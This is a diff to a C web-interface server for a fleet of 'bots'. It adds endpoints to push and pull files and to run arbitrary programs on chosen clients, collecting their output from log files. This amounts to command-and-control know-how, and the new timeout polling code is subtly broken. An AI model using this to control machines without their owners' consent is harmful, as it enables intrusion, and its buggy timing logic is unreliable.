@@ -14,6 +14,7 @@
 #include "../include/server/server_constants.h"
 #include "../include/send_message.h"
 #include "../include/receive_message.h"
+#include "../include/file_exchange.h"
 
 // Access global table for web implementation :)
 extern ClientHashTable hash_table;
@@ -76,7 +77,7 @@ void handle_list_bots(struct mg_connection *c, struct mg_http_message *hm) {
     mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response);
 }
 
-void handle_send_upload(struct mg_connection *c, struct mg_http_message *hm) {
+void handle_download_request(struct mg_connection *c, struct mg_http_message *hm) {
     char bot_id[256] = {0};
     char file_name[256] = {0};
 
@@ -104,10 +105,10 @@ void handle_send_upload(struct mg_connection *c, struct mg_http_message *hm) {
 
     // Build the Command struct
     Command cmd = {
-        .cmd_id = "UPLOAD",
-        .order_type = UPLOAD,
+        .cmd_id = "DOWNLOAD",
+        .order_type = DOWNLOAD,
         .delay = 0,
-        .program = strdup("UPLOAD"),
+        .program = strdup("DOWNLOAD"),
         .expected_exit_code = 0,
         .params = malloc(2 * sizeof(char *)) // Allocate space for params
     };
@@ -117,13 +118,50 @@ void handle_send_upload(struct mg_connection *c, struct mg_http_message *hm) {
 
     // Send the command to the client
     if (send_command(client->socket, &cmd) < 0) {
-        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send upload command to client\"}");
+        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send download command to client\"}");
         free_command(&cmd); // Free dynamically allocated fields
         return;
     }
 
     mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
     free_command(&cmd); // Free dynamically allocated fields
+}
+
+void handle_upload_request(struct mg_connection *c, struct mg_http_message *hm) {
+    char bot_id[256] = {0};
+    char file_name[512] = {0};
+
+    // Parse fields from the POST request
+    mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id));
+    mg_http_get_var(&hm->body, "file_name", file_name, sizeof(file_name));
+
+    // Validate required fields
+    if (strlen(bot_id) == 0) {
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
+        return;
+    }
+
+    if (strlen(file_name) == 0) {
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"File name is required\"}");
+        return;
+    }
+
+    // Find the target client
+    Client *client = find_client(&hash_table, bot_id);
+    if (client == NULL) {
+        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
+        return;
+    }
+
+    
+
+    // Send the command to the client
+    if (!send_file(client->socket, file_name)) {
+        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to upload file to client\"}");
+        return;
+    }
+
+    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
 }
 
 // Function to handle sending a command to a client
@@ -145,8 +183,6 @@ void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
     mg_http_get_var(&hm->body, "delay", delay_str, sizeof(delay_str));
     mg_http_get_var(&hm->body, "expected_code", expected_code_str, sizeof(expected_code_str));
 
-    
-
     int delay = atoi(delay_str);
     int expected_code = atoi(expected_code_str);
     int num_clients = atoi(num_clients_str);
@@ -158,6 +194,7 @@ void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
     }
 
     size_t targeted_clients = 0;
+    cJSON *results_array = cJSON_CreateArray(); // To store results for all targeted clients
 
     // If bot IDs are provided, target those specific clients
     if (strlen(bot_ids) > 0) {
@@ -165,27 +202,13 @@ void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
         char *bot_id = strtok(bot_ids, ",");
         while (bot_id != NULL) {
             Client *client = find_client(&hash_table, bot_id);
-            if (client != NULL && client->state == LISTENING) { // Only target active clients
-                Command cmd = {
-                    .cmd_id = "",
-                    .order_type = COMMAND_,
-                    .delay = delay,
-                    .program = strdup(program),
-                    .expected_exit_code = expected_code,
-                    .params = malloc(2 * sizeof(char *))
-                };
-
-                strncpy(cmd.cmd_id, cmd_id, sizeof(cmd.cmd_id) - 1);
-                cmd.params[0] = strdup(params);
-                cmd.params[1] = NULL;
-
-                if (send_command(client->socket, &cmd) == 0) {
+            if (client != NULL && client->state == LISTENING) {
+                // Execute command and fetch result
+                cJSON *result = execute_command_and_fetch_result(client, cmd_id, program, params, delay, expected_code);
+                if (result) {
+                    cJSON_AddItemToArray(results_array, result);
                     targeted_clients++;
                 }
-
-                free_command(&cmd);
-            } else {
-                output_log("Skipping client %s with invalid socket or state\n", LOG_DEBUG, LOG_TO_CONSOLE, client->id);
             }
             bot_id = strtok(NULL, ",");
         }
@@ -195,51 +218,30 @@ void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
         for (size_t i = 0; i < hash_table.size && targeted_clients < num_clients; i++) {
             Client *client = hash_table.table[i];
             while (client != NULL && targeted_clients < num_clients) {
-                output_log("Sending to client %s with state %d!\n", LOG_DEBUG, LOG_TO_CONSOLE, client->id, client->state);
-                if (client->state == LISTENING && client->socket > 0) { // Only target listening clients with valid sockets
-                    Command cmd = {
-                        .cmd_id = "",
-                        .order_type = COMMAND_,
-                        .delay = delay,
-                        .program = strdup(program),
-                        .expected_exit_code = expected_code,
-                        .params = NULL // Initialize params to NULL
-                    };
-
-                    strncpy(cmd.cmd_id, cmd_id, sizeof(cmd.cmd_id) - 1);
-
-                    // Split the params string into individual parameters
-                    if (strlen(params) > 0) {
-                        size_t param_count = 0;
-                        char *param = strtok(params, " ");
-                        while (param != NULL) {
-                            cmd.params = realloc(cmd.params, (param_count + 2) * sizeof(char *)); // Allocate space for new param
-                            cmd.params[param_count] = strdup(param); // Copy the parameter
-                            param_count++;
-                            param = strtok(NULL, " ");
-                        }
-                        cmd.params[param_count] = NULL; // Null-terminate the params array
-                    }
-
-                    if (send_command(client->socket, &cmd) == 0) {
+                if (client->state == LISTENING && client->socket > 0) {
+                    // Execute command and fetch result
+                    cJSON *result = execute_command_and_fetch_result(client, cmd_id, program, params, delay, expected_code);
+                    if (result) {
+                        cJSON_AddItemToArray(results_array, result);
                         targeted_clients++;
                     }
-
-                    free_command(&cmd); // Free dynamically allocated fields
-                } else {
-                    output_log("Skipping client %s with invalid socket or state\n", LOG_DEBUG, LOG_TO_CONSOLE, client->id);
                 }
                 client = client->next;
             }
         }
     }
 
-    // Respond with the number of targeted clients
-    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\",\"targeted_clients\":%lu}", targeted_clients);
+    // Respond with the results
+    cJSON *response_json = cJSON_CreateObject();
+    cJSON_AddStringToObject(response_json, "status", "success");
+    cJSON_AddNumberToObject(response_json, "targeted_clients", targeted_clients);
+    cJSON_AddItemToObject(response_json, "results", results_array);
 
-    if (targeted_clients < num_clients) {
-        output_log("Only %zu active clients were available to target (requested: %d)\n", LOG_DEBUG, LOG_TO_CONSOLE, targeted_clients, num_clients);
-    }
+    char *response_str = cJSON_PrintUnformatted(response_json);
+    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response_str);
+
+    cJSON_Delete(response_json);
+    free(response_str);
 }
 
 // Function to handle server status
@@ -498,8 +500,10 @@ void handle_request(struct mg_connection *c, int ev, void *ev_data) {
     if (ev == MG_EV_HTTP_MSG) {
         if (strncmp(hm->uri.buf, "/api/bots", hm->uri.len) == 0) {
             handle_list_bots(c, hm);
+        } else if (strncmp(hm->uri.buf, "/api/download", hm->uri.len) == 0) {
+            handle_download_request(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/upload", hm->uri.len) == 0) {
-            handle_send_upload(c, hm);
+            handle_upload_request(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/command", hm->uri.len) == 0) {
             output_log("Received send command request from webserver!\n", LOG_DEBUG, LOG_TO_CONSOLE);
             handle_send_command(c, hm);
@@ -538,4 +542,87 @@ void *start_web_interface(void *arg) {
 
     mg_mgr_free(&mgr); // Free resources
     return NULL;
+}
+
+cJSON *execute_command_and_fetch_result(Client *client, const char *cmd_id, const char *program, const char *params, int delay, int expected_code) {
+    // Build the Command struct
+    Command cmd = {
+        .cmd_id = "",
+        .order_type = COMMAND_,
+        .delay = delay,
+        .program = strdup(program),
+        .expected_exit_code = expected_code,
+        .params = malloc(2 * sizeof(char *))
+    };
+
+    strncpy(cmd.cmd_id, cmd_id, sizeof(cmd.cmd_id) - 1);
+    cmd.params[0] = strdup(params);
+    cmd.params[1] = NULL;
+
+    // Send the command to the client
+    if (send_command(client->socket, &cmd) < 0) {
+        free_command(&cmd);
+        return NULL;
+    }
+
+    // Open the client's log file
+    char log_file_path[512];
+    snprintf(log_file_path, sizeof(log_file_path), "client_messages/%s_messages.txt", client->id);
+
+    FILE *log_file = fopen(log_file_path, "r");
+    if (!log_file) {
+        free_command(&cmd);
+        return NULL;
+    }
+
+    // Seek to the end of the file
+    fseek(log_file, 0, SEEK_END);
+    long initial_position = ftell(log_file);
+
+    // Poll for changes to the log file
+    char buffer[1024];
+    struct timeval start, current;
+    gettimeofday(&start, NULL);
+
+    int timeout = 1; // 100-ms timeout
+    int changes_detected = 0;
+
+    while (1) {
+        gettimeofday(&current, NULL);
+        long elapsed_time = (current.tv_usec - start.tv_usec);
+
+        if (elapsed_time > timeout) {
+            break; // Timeout reached
+        }
+
+        fseek(log_file, initial_position, SEEK_SET);
+        while (fgets(buffer, sizeof(buffer), log_file)) {
+            changes_detected = 1;
+            initial_position = ftell(log_file);
+        }
+
+        if (changes_detected) {
+            // Reset timeout if changes are detected
+            gettimeofday(&start, NULL);
+            changes_detected = 0;
+        }
+
+        usleep(100000); // Sleep for 100ms before polling again
+    }
+
+    // Read the new data from the log file
+    fseek(log_file, initial_position, SEEK_SET);
+    cJSON *result_json = cJSON_CreateObject();
+    cJSON_AddStringToObject(result_json, "client_id", client->id);
+
+    cJSON *output_array = cJSON_CreateArray();
+    while (fgets(buffer, sizeof(buffer), log_file)) {
+        cJSON_AddItemToArray(output_array, cJSON_CreateString(buffer));
+    }
+    cJSON_AddItemToObject(result_json, "output", output_array);
+
+    fclose(log_file);
+    free_command(&cmd);
+
+    return result_json;
 }
